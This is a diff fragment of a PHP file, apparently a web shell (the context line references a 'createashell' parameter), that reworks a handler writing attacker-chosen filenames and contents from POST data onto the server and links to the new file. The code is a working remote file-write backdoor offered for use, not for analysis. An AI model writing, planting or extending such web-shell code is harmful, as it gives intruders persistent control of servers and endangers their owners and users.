@@ -143,12 +143,42 @@ if (isset($_GET['createashell'])) {
 
 <?php	
 
-$filename = @$_POST['filename'];
-$content = @$_POST['content'];
+if ( 	isset($_POST['filename'])	&& 	isset($_POST['content']) ) {
+	
 
-		$code = @fopen($filename, 'a');
-				@fwrite($code, $content);
-				@fclose($code);
+	$filename       =   @$_POST['filename'];
+	$filecontent	= 	@$_POST['content'];
+
+		if (!empty($filename) && !empty($filecontent)) {
+			
+
+				if (file_exists($filename)) {
+
+					echo 'Sorry! The filename already exists<br>';
+					
+				} else {
+
+
+				$file = fopen($filename, "a");
+
+
+				fwrite($file, $filecontent);
+
+				fclose($file);
+
+					echo '<a href="'.$filename.'" style="color:lime;">Done!</a><br>';
+}
+
+
+
+		}  else {
+
+			echo 'Why are you here? It\'s your fault.<br>';
+		}
+
+
+}				
+
 
 		die();
 
